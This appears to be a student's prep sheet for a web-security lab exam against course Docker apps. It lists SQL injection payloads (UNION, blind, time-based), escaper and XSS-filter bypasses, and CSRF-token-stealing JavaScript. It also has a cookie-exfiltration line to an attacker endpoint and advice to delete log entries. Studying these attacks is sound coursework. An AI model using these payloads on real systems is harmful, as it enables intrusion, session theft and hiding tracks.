# A2 Prediction & Prep — What's Likely Coming and How to Beat It

Based on the A1, B1, C1 pattern + the exact reading materials you were given. Faculty said
A2 will be *harder* and repeats are unlikely — so this predicts the **new twists** on top of
the parts that always repeat.

---

## 1. The invariant skeleton (this WILL repeat — bank it)

Every one of A1/B1/C1 was the same machine with different paint:

| Piece | A1 | B1 | C1 | A2 (expected) |
|---|---|---|---|---|
| Two Docker apps | Fines + Marketplace | Gym + Forum | Registration + Chat | **two apps again** |
| App 1 | SQLi-vulnerable login | same | same | same |
| App 2 | normal login, no CSRF protection | same | same | same |
| Ports | 3000/3001 | 5000/5001 | 3000/3001 | probably 6000/6001 |
| `log` table for bonus | ✓ | ✓ | ✓ | ✓ |
| Attacker + victim creds | ✓ | ✓ | ✓ | ✓ |
| 40 min, 10 + 1 marks | ✓ | ✓ | ✓ | ✓ |
| Submit `2105046-a2.txt` | ✓ | ✓ | ✓ | ✓ |

**The 5-task shape that always repeats:**
1. **SQLi confirm + schema discovery** (`information_schema` → tables → columns).
2. **Full roster extraction** (with an aggregation/relationship twist).
3. **Stacked-query `UPDATE`** to plant a stored-XSS payload (own record or victim's).
4. **The chain**: a "normal check" fires the stored XSS → credentialed cross-origin `fetch`
   (CSRF) into app 2 → some second-stage effect.
5. **Bonus**: `DELETE` only your own rows from `log`, leaving everyone else's.

So ~6-7 marks are *free* if you drill the skeleton. The new difficulty lives in the twists below.

---

## 2. What's already been tested (so A2 won't reuse it)

- UNION-based visible extraction ✔ (all three)
- `GROUP BY` + `LEFT JOIN` + zero-total members ✔ (A1)
- Stored XSS in **own** record ✔ (A1, C1)
- Stored XSS in **victim's** record ✔ (B1)
- Second-order / chained stored XSS ✔ (C1)
- Reflected XSS via a lure link + double URL-encoding ✔ (B1)
- CSRF via credentialed `fetch` ✔ (all three)
- Deriving a value from the DB at exploit time ✔ (A1)
- Forensic `DELETE` cleanup ✔ (all three)

A2 will remix these and add **at least one thing from Section 3.**

---

## 3. High-probability NEW twists for A2 (ranked)

### 🥇 A. A partial DEFENSE you must bypass  — *most likely*
The reading spends whole sections on defenses + their weaknesses. A2 "getting harder" most
naturally = "the easy hole is patched; find the imperfect patch."

**A1 — Imperfect quote escaping (reading §17.4).** The app escapes `'` → `\'` but is buggy.
Bypasses to have ready:
- **Escape-the-escaper:** input a backslash so `\'` becomes `\\'` → the `\\` is a literal
  backslash and your `'` is *unescaped*. Classic, and literally described in your reading.
- **Numeric / unquoted context:** if a field like `id=7700002` isn't wrapped in quotes,
  escaping quotes does nothing — inject directly: `id=1 OR 1=1`.
- **Alternate encodings:** the app filters `'` but the framework URL-decodes `%27` *after*
  the filter → send `%27`. Or use `CHAR()`/`0x...` hex string literals so no quote appears:
  `WHERE name = 0x61646d696e` instead of `'admin'`.

**A2 — XSS filter that strips tags (reading §22.3).** Bypasses to have ready:
- Filter removes `<script>` once → **nest it**: `<scr<script>ipt>...</scr</script>ipt>`.
- Filter targets `<script>` → **use an event handler instead**:
  `<img src=x onerror=...>`, `<svg onload=...>`, `<body onload=...>`, `<iframe onload=...>`.
- Filter is case-sensitive → `<ScRiPt>`. Filter blocks `onerror` → try `onload`, `onmouseover`,
  `onfocus autofocus`.

> If output is HTML-entity-encoded (`&lt;script&gt;`), XSS in *that* sink is dead — pivot to a
> different sink (an attribute, a JS context, a URL) or a different field.

### 🥈 B. BLIND SQL injection (no visible output) — *very likely*
All three showed you the query result on screen (UNION worked). The obvious escalation:
the login only says **"success / fail"** (or nothing), so UNION shows you nothing. Then you
extract **one bit at a time.**

- **Boolean-based:** find a field/response that differs for true vs false, then:
  ```sql
  ' OR (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a' -- -
  ```
  Binary-search each character with `>`/`<` and `ASCII(SUBSTRING(...))`.
- **Time-based** (when even true/false looks identical):
  ```sql
  ' OR IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>77, SLEEP(2), 0) -- -
  ```
  Slow response = condition true.
- Have `LENGTH()`, `SUBSTRING()`, `ASCII()`, `IF()`, `SLEEP()` memorized.

> Blind is tedious by hand in 40 min — expect them to keep the secret **short** (a PIN, a
> few chars). Script the loop in the browser console with `fetch` if allowed.

### 🥉 C. A CSRF token / defense on app 2 — *likely, pairs with XSS*
So far app 2 had **no** CSRF protection, so a blind `fetch` worked. A2 may add a **CSRF token**
(reading §21.2). You can't guess it — but **XSS beats CSRF tokens**: your injected script runs
*on the victim's page*, so it can **read the token from the DOM first**, then submit:
```js
var t = document.querySelector('input[name=csrf_token]').value;
fetch("/action", {method:"POST", credentials:"include",
  headers:{"content-type":"application/x-www-form-urlencoded"},
  body:"csrf_token="+encodeURIComponent(t)+"&amount=100&to=me"});
```
Or fetch the form page, parse the token out, then post. Referer/SameSite variants: note that
a same-site XSS-driven request still passes Referer and SameSite checks (the request *is* from
the real origin) — good exam-explanation points.

### D. Cookie / secret exfiltration to an attacker endpoint — *plausible*
Impact not yet used: instead of performing an action, **steal the victim's session** and send
it out:
```js
new Image().src = "http://localhost:PORT_ATTACKER/steal?c=" + encodeURIComponent(document.cookie);
// or fetch(... ) to your own listening endpoint
```
Then reuse the cookie to log in as the victim. Watch for `HttpOnly` (blocks `document.cookie`)
— if set, pivot to performing the action directly rather than stealing the cookie.

### E. Multi-table JOIN / subquery extraction — *plausible*
A1 tested aggregation; A2 could split data across **two tables** so you must `JOIN` to
correlate (e.g. `users` ⋈ `secrets ON users.id = secrets.uid`) or use a **subquery** to pick a
specific row (`WHERE x = (SELECT MAX(...) ...)`). Re-read `SQL_TUTORIAL.md` §6–7.

### F. Second-order SQL injection — *outside chance*
Mirrors C1's second-order XSS: your input is **stored** safely, then later used **unsafely** in
a different query. You inject in a profile/name field; it detonates when an admin page runs a
query over it.

### G. CSP (reading §22.4) — *low, but be ready to explain*
If a `Content-Security-Policy` blocks inline scripts, injected `<script>`/`onerror` won't run.
Full bypass is hard in 40 min; more likely they **ask you to explain why your XSS is blocked**
and what CSP does. Know: CSP allows only whitelisted script sources; inline/injected scripts
are refused.

---

## 4. Pre-built snippets to memorize before the exam

**Schema discovery (visible):**
```sql
' UNION SELECT 1,2,GROUP_CONCAT(table_name),4 FROM information_schema.tables WHERE table_schema=DATABASE()-- -
' UNION SELECT 1,2,GROUP_CONCAT(column_name),4 FROM information_schema.columns WHERE table_name='TBL'-- -
```
(Adjust the column count with `ORDER BY N`/`UNION SELECT 1,2,..,N` first.)

**Extraction (visible):**
```sql
' UNION SELECT 1,2,GROUP_CONCAT(col1,0x20,col2 SEPARATOR 0x3c62723e),4 FROM TBL-- -
```
(`0x20`=space, `0x3c62723e`=`<br>` — hex dodges quote issues.)

**Stored-XSS via stacked UPDATE:**
```sql
'; UPDATE TBL SET field='<img src=x onerror="...">' WHERE id=VICTIM-- -
```

**Reflected/nested payload encoding:** build the `fetch` in the console, run the two nested
`encodeURIComponent` calls **offline**, paste the finished `%25…` blob (no runtime encode, no
`</script>` in your source). One `encodeURIComponent` per URL-decode hop.

**Blind bit-extraction primitives:** `LENGTH()`, `SUBSTRING(s,i,1)`, `ASCII()`, `IF(cond,SLEEP(2),0)`, `OR (SELECT ...)='x'`.

**Escaper bypasses:** trailing `\` (escape-the-escaper), `%27` for `'`, `0x...`/`CHAR()` string
literals, numeric-field injection with no quotes.

**XSS filter bypasses:** `<img src=x onerror=>`, `<svg onload=>`, `<scr<script>ipt>`, case
flips, alternate event handlers.

**CSRF-token-aware post:** read token from DOM, include it in the body.

---

## 5. 40-minute game plan

1. **0–3 min:** load both apps, log in as attacker, find the injectable field. Test `'` → error?
   Test `<b>hi</b>` in any reflected field → does it render (raw HTML) or escape?
2. **3–5 min:** column count (`ORDER BY N`), confirm which slot is displayed.
3. **5–12 min:** schema discovery + full extraction. Bank Tasks 1–2.
4. **12–15 min:** detect the twist — is output hidden (→ blind)? is there a filter (→ bypass)?
   is there a CSRF token (→ read from DOM)?
5. **15–32 min:** build the stored-XSS → chain. Test the `fetch` in the console first, then wrap.
6. **32–38 min:** bonus `DELETE` cleanup; verify only your rows are gone.
7. **38–40 min:** write payloads + input fields + roster + ordered steps into `2105046-a2.txt`.
   **Every payload needs its app + field label** — no-context payloads lose marks.

---

## 6. One-line odds

- **Almost certain:** two apps, `information_schema` discovery, stacked-`UPDATE` stored XSS,
  credentialed-`fetch` CSRF chain, `log` cleanup bonus.
- **Most likely new twist:** a partial defense to bypass (imperfect escaper *or* XSS filter),
  and/or **blind SQLi** because visible UNION is exhausted.
- **Likely companion:** a CSRF token you defeat by reading it via your XSS.
- **Wildcards:** cookie exfiltration, multi-table JOIN extraction, second-order SQLi.

Prep priority: **(1) blind SQLi drills, (2) escaper + XSS-filter bypass reflexes, (3) reading a
CSRF token from the DOM.** Those three cover the realistic "harder" surface.
